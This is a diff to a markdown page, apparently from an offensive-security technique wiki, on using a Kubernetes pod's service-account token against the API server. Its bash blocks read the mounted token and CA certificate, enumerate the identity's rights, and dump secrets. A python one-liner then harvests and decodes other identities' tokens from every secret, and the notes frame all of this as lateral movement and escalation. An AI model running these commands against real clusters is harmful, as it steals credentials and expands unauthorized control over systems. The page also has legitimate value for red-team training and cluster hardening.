@@ -1,31 +1,46 @@
 ---
-title: "Service account token to API: authenticating with a stolen token"
-description: "Using a stolen Kubernetes service-account token to authenticate to the API server and act as that identity, enumerating and exercising its permissions across namespaces to move laterally and escalate within the cluster."
+title: "Service account token to API: acting on the cluster with a pod identity"
+description: "A pod's service-account token authenticates to the API server. The attacker enumerates exactly what that identity may do with SelfSubjectRulesReview, then exercises it: reading secrets, listing workloads, or using an escalation verb. This is the pivot from a container foothold to operating against the cluster control plane as the pod's identity."
 keywords:
   - service account token
-  - API authentication
+  - api server
   - bearer token
+  - can-i
   - lateral movement
-  - kubernetes identity
 ---
 
 # Service account token to API
 
-A service-account token is a bearer credential for the API. With one in hand, point a client at the API server and act as that account. The first move is to learn what it can do, then exercise it: read more secrets, create pods, or reach namespaces the original foothold could not.
+The token mounted into every pod is a bearer credential for the API server, and using it is the first lateral step from a container foothold to the control plane. The move is to authenticate with the token, enumerate the identity's rights precisely, and then exercise whatever those rights permit, whether reading secrets, listing workloads to plan further movement, or invoking an escalation verb.
 
 ```bash
-API=https://kubernetes.default.svc
-kubectl --server=$API --token=<stolen> --insecure-skip-tls-verify auth can-i --list
-kubectl --server=$API --token=<stolen> --insecure-skip-tls-verify get secrets -A
+APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
+T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+C=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+# what can this identity do?
+kubectl --token="$T" --certificate-authority="$C" --server="$APISERVER" auth can-i --list
+# exercise it: read secrets in a namespace the token can reach
+kubectl --token="$T" --certificate-authority="$C" --server="$APISERVER" \
+  -n <ns> get secrets -o yaml
+```
+
+## Turning rights into movement
+
+```bash
+# list workloads to map targets and find more tokens
+kubectl --token="$T" ... get pods,deploy,sa -A
+# if the identity can read secrets, harvest tokens for other identities
+kubectl --token="$T" ... get secrets -A -o json | \
+  python3 -c 'import sys,json,base64;[print(base64.b64decode(s["data"]["token"]).decode()[:50]) for s in json.load(sys.stdin)["items"] if s.get("data",{}).get("token")]'
 ```
 
 ## Exploitation notes
 
-- Tokens are namespace-bound identities but their RBAC can be cluster-wide; `auth can-i --list` reveals the true scope.
-- Projected tokens are audience-bound and short-lived; use them promptly and against the intended API audience.
-- Chain into [RBAC privilege escalation](../rbac-privilege-escalation/index.md) if the token can escalate, bind, impersonate, or create pods.
+- `auth can-i --list` first, always: it defines the identity's reach and tells you which of reading secrets, creating pods, or an escalation verb is available, so you do not waste attempts.
+- A default service account with no bindings can still do cluster discovery (list some resources) in many clusters; even that maps targets for the next move.
+- When the rights include an escalation verb, continue into the [RBAC privilege escalation](../rbac-privilege-escalation/index.md) group rather than only moving sideways.
 
 ## References
 
-- [Kubernetes: authenticating](https://kubernetes.io/docs/reference/access-authn-authz/authentication/)
-- [Kubernetes: service account tokens](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/)
+- [Kubernetes: authenticating with service account tokens](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens)
+- [Kubernetes: SelfSubjectRulesReview](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/self-subject-rules-review-v1/)
